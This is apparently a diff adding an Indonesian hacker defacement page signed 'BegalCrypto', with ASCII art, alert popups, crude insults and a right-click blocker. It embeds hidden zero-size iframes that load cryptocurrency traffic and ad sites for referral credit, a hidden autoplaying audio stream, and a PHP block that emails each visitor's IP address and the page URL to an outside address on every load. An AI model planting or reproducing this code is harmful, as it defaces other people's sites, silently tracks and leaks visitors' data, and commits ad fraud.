@@ -1,0 +1,80 @@
+<html>
+<head>
+<script>window.alert('biaya idup mahal kampang!')</script>
+<script>window.alert('klik iklan gw juga Cok, 1 klik = 1000 pahala untuk anda :) :v')</script>
+<title>Untitled Website</title>
+<link href="https://kfmradio.com/sites/default/files/thumbnails/image/404logo.gif" type="image/x-icon" rel="shortcut icon">
+<link type="text/css" href="http://anicrack-indo.netii.net/error.css" rel="stylesheet">
+<link type="text/javascript" href="https://cdnjs.cloudflare.com/ajax/libs/three.js/84/three.min.js" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Kaushan+Script|Special+Elite" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Stardos+Stencil" rel="stylesheet">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta content="cari web yg vuln mulu sampai lupa cari pahala kontol !" name="description"/>
+<meta content="BegalCrypto" name="keywords"/>
+<meta content="BegalCrypto" name="Abstract"/>
+<meta name="title" content="AKU DISINI GUYS :v"/>
+<meta name="googlebot" content="index,follow"/>
+<meta name="robots" content="all"/>
+<meta name="distribution" content="global"/>
+<meta name="generator" content="Begalrypto"/>
+<?if(rand(1,10)<=5){?><iframe src="http://traffic2bitcoin.com/ptp.php?ref=rikad" marginwidth="0" marginheight="0" width="0" height="0" scrolling="no" border="0" frameborder="0"></iframe><?}?>
+<?if(rand(1,10)<=5){?><iframe src="https://traffic2bitcoin.com/ptp.php?ref=rikad&sitetype=1" marginwidth="0" marginheight="0" width="0" height="0" scrolling="no" border="0" frameborder="0"></iframe><?}?>
+</head>
+<body style="background-color:red">
+<center>
+<pre style="color:white;"><b>
+
+   _       _              _        
+  (_) __ _| | ____ _ _ __| |_ __ _ 
+  | |/ _` | |/ / _` | '__| __/ _` |
+  | | (_| |   < (_| | |  | || (_| |
+ _/ |\__,_|_|\_\__,_|_|   \__\__,_|
+|__/                               
+
+</b></pre>
+<pre style="color:white;"><b>
+                                   _     _ 
+ _ __   __ _ _ __ __ _ _ __   ___ (_) __| |
+| '_ \ / _` | '__/ _` | '_ \ / _ \| |/ _` |
+| |_) | (_| | | | (_| | | | | (_) | | (_| |
+| .__/ \__,_|_|  \__,_|_| |_|\___/|_|\__,_|
+|_|                                        
+
+</b></pre><a href="https://www.begalcrypto.zone.id/" ><font style="font-family: 'Special Elite', cursive;">tested by BegalCrypto</font></a>
+<div class="error">
+<img src="https://lh3.googleusercontent.com/-YQm83lEZlCo/XMUUkMp_FDI/AAAAAAAAATk/8Ad5D_SatsEwa501h5T_D7xHyBDTws-kgCLcBGAs/h240/1556419698294.png" width="200" height="200"/>
+</div>
+<br><br>
+<font style="color:#ffffff;font-family: 'Special Elite', cursive; ">Life Is Short.Smile While You Still Have Teeth.<br>Tinggalkan Mantan,Tinggalkan Kenangan,Tinggalkan Makan,Dekati Tuhan.<br>Never Give Up Im Moving Forward.</font><br>
+<iframe autoplay="autoplay" height="0" weight="0" frameborder="no" visibility="hidden" wmode="transparent" controls="controls" src="https://api.soundcloud.com/tracks/347068248/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" type="audio/mpeg"></iframe>
+<br>
+<marquee behavior="alternate" scrollamount="15"><iframe src="https://ad2bitcoin.com/ad.php?ref=rikad&width=468" marginwidth="0" marginheight="0" width="468" height="60" scrolling="no" border="0" frameborder="0"></iframe><br>
+<iframe data-aa="1156528" src="//ad.a-ads.com/1156528?size=468x60" scrolling="no" style="width:468px; height:60px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe>
+</marquee>
+</center>
+<script type="text/javascript">
+document.onmousedown=disableclick;
+status="Mau Ngapain lu Cok!!!!";
+function disableclick(event)
+{
+  if(event.button==2)
+   {
+     alert(status);
+     return false;   
+   }
+}
+</script>
+</body>
+</html>
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'rikad404@null.net';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "webnya $x_path :3 *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "Website Diakses Cok", $pesan_alert);
+?>
